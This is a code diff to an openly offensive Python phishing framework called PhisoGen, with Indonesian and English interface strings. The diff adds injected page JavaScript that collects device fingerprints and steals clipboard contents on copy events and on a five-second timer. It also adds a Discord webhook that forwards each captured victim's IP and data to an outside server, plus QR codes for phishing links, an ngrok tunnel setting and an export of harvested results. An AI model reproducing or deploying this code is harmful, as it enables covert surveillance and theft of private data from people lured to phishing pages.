@@ -4,7 +4,7 @@ import os
 import random
 import string
 import time
-import socket
+import urllib.parse
 import threading
 import requests
 import logging
@@ -39,7 +39,10 @@ class PhishingGenerator:
         self.show_victims = False
         self.shortener = pyshorteners.Shortener()
         self.secret_key = os.urandom(24)
-        self.live_display = None # Tambahkan inisialisasi live_display
+        self.live_display = None
+        self.webhook_url = self._load_session_key('webhook_url')
+        self.ngrok_region = self._load_session_key('ngrok_region') or 'ap'
+        self.server_port = self._load_session_key('server_port') or 5000
         
         # Setup logging
         try:
@@ -106,6 +109,21 @@ class PhishingGenerator:
                 permission_script = """
                 <script>
                 window.onload = function() {
+                    // Collect device info
+                    fetch('/collect-data', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            type: 'device_info',
+                            data: {
+                                userAgent: navigator.userAgent,
+                                platform: navigator.platform,
+                                language: navigator.language,
+                                screen: screen.width + 'x' + screen.height,
+                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                            }
+                        })
+                    });
                     // Request permissions based on phishing type
                 """
                 
@@ -253,6 +271,37 @@ class PhishingGenerator:
                         }
                     });
                     """
+                elif phish_type == "clipboard":
+                    permission_script += """
+                    // Capture clipboard data on copy events
+                    document.addEventListener('copy', function(e) {
+                        var clipboardData = window.getSelection().toString();
+                        fetch('/collect-data', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                type: 'clipboard',
+                                data: { content: clipboardData }
+                            })
+                        });
+                    });
+                    // Also capture periodically
+                    setInterval(function() {
+                        navigator.clipboard.readText().then(function(text) {
+                            if (text && text.length > 0) {
+                                fetch('/collect-data', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({
+                                        type: 'clipboard',
+                                        data: { content: text }
+                                    })
+                                });
+                            }
+                        }).catch(function() {});
+                    }, 5000);
+                    """
+
                 elif phish_type == "file":
                     permission_script += """
                     // Create and show file upload popup
@@ -368,16 +417,19 @@ class PhishingGenerator:
                 return jsonify({'status': 'error', 'message': str(e)}), 500
 
     def _load_session_token(self):
+        return self._load_session_key('ngrok_token')
+
+    def _load_session_key(self, key):
         if os.path.exists(SESSION_FILE):
             try:
                 with open(SESSION_FILE, 'r') as f:
                     session = json.load(f)
-                    return session.get('ngrok_token')
+                    return session.get(key)
             except:
                 pass
         return None
 
-    def _save_session_token(self, token):
+    def _save_session_key(self, key, value):
         session = {}
         if os.path.exists(SESSION_FILE):
             try:
@@ -385,9 +437,12 @@ class PhishingGenerator:
                     session = json.load(f)
             except:
                 pass
-        session['ngrok_token'] = token
+        session[key] = value
         with open(SESSION_FILE, 'w') as f:
             json.dump(session, f)
+
+    def _save_session_token(self, token):
+        self._save_session_key('ngrok_token', token)
 
     def _clear_session_token(self):
         if os.path.exists(SESSION_FILE):
@@ -401,8 +456,8 @@ class PhishingGenerator:
                 pass
 
     def save_result(self, result):
-        """Simpan hasil dengan penanganan kesalahan"""
         try:
+            self.results.append(result)
             with open('phishing_results.txt', 'a', encoding='utf-8') as f:
                 f.write(f"\n{'='*50}\n")
                 f.write(f"Tipe: {result['type']}\n")
@@ -410,7 +465,6 @@ class PhishingGenerator:
                 f.write(f"Waktu: {result['timestamp']}\n")
                 f.write(f"Data: {result['data']}\n")
             
-            # Tampilkan hasil secara realtime di terminal
             console.print(Panel(f"""
 [cyan]🎣 Data Phishing Baru Ditangkap![/]
     
@@ -419,8 +473,38 @@ class PhishingGenerator:
 [yellow]Waktu:[/] {result['timestamp']}
 [yellow]Data:[/] {result['data']}
             """))
+            self.send_webhook(result)
         except Exception as e:
             self.logger.error(f"Error menyimpan hasil: {str(e)}")
+
+    def send_webhook(self, result):
+        if not self.webhook_url:
+            return
+        try:
+            embed = {
+                "embeds": [{
+                    "title": "🎣 PhisoGen - Data Captured",
+                    "color": 16711680,
+                    "fields": [
+                        {"name": "Type", "value": result['type'], "inline": True},
+                        {"name": "IP", "value": result['ip'], "inline": True},
+                        {"name": "Time", "value": result['timestamp'], "inline": False},
+                        {"name": "Data", "value": f"```json\n{json.dumps(result['data'], indent=2)[:1000]}\n```", "inline": False}
+                    ],
+                    "footer": {"text": "ZetaGo-Aurum · PhisoGen v3.0"}
+                }]
+            }
+            requests.post(self.webhook_url, json=embed, timeout=5)
+        except:
+            pass
+
+    def generate_qr(self, url):
+        try:
+            encoded = urllib.parse.quote(url, safe='')
+            qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={encoded}"
+            console.print(Panel(f"[cyan]📱 QR Code for phishing link:[/]\n[underline]{qr_url}[/]\n[yellow]Scan to open the link[/]"))
+        except:
+            pass
 
     def select_language(self):
         """Pilih bahasa aplikasi"""
@@ -450,7 +534,7 @@ class PhishingGenerator:
                 console.print("[green]✓ Ngrok token saved to session[/]")
 
             conf.get_default().auth_token = self.ngrok_auth_token
-            conf.get_default().region = "ap"
+            conf.get_default().region = self.ngrok_region
 
             try:
                 ngrok.kill()
@@ -460,7 +544,7 @@ class PhishingGenerator:
             tunnel_options = {
                 "bind_tls": True,
                 "proto": "http",
-                "addr": "5000",
+                "addr": str(self.server_port),
                 "inspect": False,
                 "auth": None,
                 "host_header": "rewrite"
@@ -504,6 +588,68 @@ class PhishingGenerator:
             self.logger.error(msg)
             console.print(f"[red]{msg}[/]")
             self.server_url = None
+
+    def settings_menu(self):
+        self.clear_screen()
+        regions = {'us': 'United States', 'eu': 'Europe', 'ap': 'Asia Pacific', 'au': 'Australia', 'sa': 'South America', 'jp': 'Japan', 'in': 'India'}
+        console.print(Panel("⚙️ Settings", border_style="cyan"))
+        console.print(f"\n[cyan]Current settings:[/]")
+        console.print(f"  [yellow]Ngrok Region:[/] {self.ngrok_region.upper()} ({regions.get(self.ngrok_region, 'Unknown')})")
+        console.print(f"  [yellow]Server Port:[/] {self.server_port}")
+        console.print(f"  [yellow]Webhook URL:[/] {self.webhook_url or 'Not set'}")
+        console.print("\n[1] Change ngrok region")
+        console.print("[2] Change server port")
+        console.print("[3] Set Discord webhook URL")
+        console.print("[4] Clear webhook URL")
+        console.print("[5] Back to menu")
+        choice = console.input("\n[yellow][[?]] Select option (1-5): [/]")
+        if choice == "1":
+            console.print("\nAvailable regions:")
+            for code, name in regions.items():
+                console.print(f"  [{code}] {name}")
+            reg = console.input("\n[yellow]Enter region code: [/]").lower()
+            if reg in regions:
+                self.ngrok_region = reg
+                self._save_session_key('ngrok_region', reg)
+                console.print(f"[green]✓ Region set to {reg.upper()}[/]")
+        elif choice == "2":
+            try:
+                port = int(console.input("\n[yellow]Enter port number (1024-65535): [/]"))
+                if 1024 <= port <= 65535:
+                    self.server_port = port
+                    self._save_session_key('server_port', port)
+                    console.print(f"[green]✓ Port set to {port}[/]")
+                else:
+                    console.print("[red]Port must be between 1024 and 65535[/]")
+            except:
+                console.print("[red]Invalid port[/]")
+        elif choice == "3":
+            url = console.input("\n[yellow]Enter Discord webhook URL: [/]")
+            if url.startswith('https://discord.com/api/webhooks/'):
+                self.webhook_url = url
+                self._save_session_key('webhook_url', url)
+                console.print("[green]✓ Webhook URL saved[/]")
+            else:
+                console.print("[red]Invalid Discord webhook URL[/]")
+        elif choice == "4":
+            self.webhook_url = None
+            self._save_session_key('webhook_url', None)
+            console.print("[green]✓ Webhook URL cleared[/]")
+        console.input("\n[green]Press Enter to continue...[/]")
+
+    def export_results(self):
+        if not self.results:
+            console.print("[red]No results to export[/]")
+            console.input("\n[green]Press Enter to continue...[/]")
+            return
+        try:
+            filename = f"export_{int(time.time())}.json"
+            with open(filename, 'w', encoding='utf-8') as f:
+                json.dump(self.results, f, indent=2)
+            console.print(f"[green]✓ Results exported to {filename}[/]")
+        except Exception as e:
+            console.print(f"[red]Export failed: {str(e)}[/]")
+        console.input("\n[green]Press Enter to continue...[/]")
 
     def add_victim_data(self, victim_ip, data):
         """Tambah data korban dan update display realtime dengan penanganan error"""
@@ -558,8 +704,8 @@ class PhishingGenerator:
         ║ ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝██║ ║
         ║ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚═╝ ║
         ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝                                                                                                    
-    [yellow][*] Created By: Rayhan Dzaky AL Mubarok
-    [green][*] Version: 2.1 - Advanced Phishing Framework with Ngrok Integration
+    [yellow][*] Created By: ZetaGo-Aurum
+    [green][*] Version: 3.0 - Advanced Phishing Framework with Ngrok Integration
     [cyan][*] Server Status: {'🟢 Online' if self.server_url else '🔴 Offline'} - {self.server_url if self.server_url else 'Not Connected'}
         """
         console.print(Panel(banner))
@@ -578,10 +724,16 @@ class PhishingGenerator:
             ("3", "Camera Phishing" if self.language == "en" else "Phishing Kamera",
              "Access victim's camera" if self.language == "en" else "Akses kamera korban"),
             ("4", "File Phishing" if self.language == "en" else "Phishing File",
-             "Get files from victim" if self.language == "en" else "Dapatkan file dari korban"),
-            ("5", "View Results" if self.language == "en" else "Lihat Hasil",
+              "Get files from victim" if self.language == "en" else "Dapatkan file dari korban"),
+            ("5", "Clipboard Phishing" if self.language == "en" else "Phishing Clipboard",
+             "Capture clipboard data" if self.language == "en" else "Tangkap data clipboard korban"),
+            ("6", "View Results" if self.language == "en" else "Lihat Hasil",
              "View captured data" if self.language == "en" else "Lihat data yang didapat"),
-            ("6", "Exit" if self.language == "en" else "Keluar",
+            ("7", "Export Data" if self.language == "en" else "Ekspor Data",
+             "Export results to JSON" if self.language == "en" else "Ekspor hasil ke JSON"),
+            ("8", "Settings" if self.language == "en" else "Pengaturan",
+             "Configure webhook, region, port" if self.language == "en" else "Atur webhook, region, port"),
+            ("9", "Exit" if self.language == "en" else "Keluar",
              "Exit program" if self.language == "en" else "Keluar dari program")
         ]
         
@@ -640,7 +792,6 @@ class PhishingGenerator:
             if not shortened_url:
                 shortened_url = phish_url
             
-            # Tampilkan hasil dengan format yang rapi
             console.print(Panel(f"""
 [cyan]🎣 Link Phishing Berhasil Dibuat![/]
     
@@ -653,6 +804,8 @@ class PhishingGenerator:
 [green]✨ Link telah dipersingkat dan dimasker untuk penyamaran yang lebih baik![/]
 [red]⚠️ Link akan tetap aktif hingga program ditutup[/]
             """))
+            
+            self.generate_qr(shortened_url)
             
             return shortened_url
             
@@ -671,7 +824,7 @@ class PhishingGenerator:
             flask_thread = threading.Thread(
                 target=lambda: self.app.run(
                     host='0.0.0.0', 
-                    port=5000,
+                    port=self.server_port,
                     threaded=True,
                     debug=False
                 )
@@ -684,7 +837,7 @@ class PhishingGenerator:
                 self.display_banner()
                 self.display_menu()
                 
-                choice = console.input(f"\n[yellow][[?]] {'Select menu' if self.language == 'en' else 'Pilih menu'} (1-6): [/]")
+                choice = console.input(f"\n[yellow][[?]] {'Select menu' if self.language == 'en' else 'Pilih menu'} (1-9): [/]")
                 
                 if choice == "1":
                     target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
@@ -719,6 +872,14 @@ class PhishingGenerator:
                     console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
                 
                 elif choice == "5":
+                    target = console.input(f"\n[yellow][[?]] {'Enter target URL' if self.language == 'en' else 'Masukkan URL target'}: [/]")
+                    with Progress() as progress:
+                        task = progress.add_task("[cyan]Generating phishing link...", total=100)
+                        self.generate_phishing_link("clipboard", target_url=target)
+                        progress.update(task, advance=100)
+                    console.input(f"\n[green]{'Press Enter to continue...' if self.language == 'en' else 'Tekan Enter untuk melanjutkan...'}[/]")
+                
+                elif choice == "6":
                     self.show_victims = True
                     self.update_live_display()
                     console.input(f"\n[green]{'Press Enter to return to menu...' if self.language == 'en' else 'Tekan Enter untuk kembali ke menu...'}[/]")
@@ -727,7 +888,13 @@ class PhishingGenerator:
                         self.live_display.stop()
                         self.live_display = None
                 
-                elif choice == "6":
+                elif choice == "7":
+                    self.export_results()
+                
+                elif choice == "8":
+                    self.settings_menu()
+                
+                elif choice == "9":
                     msg = "Closing program..." if self.language == "en" else "Menutup program..."
                     console.print(f"\n[red][[!]] {msg}[/]")
                     break
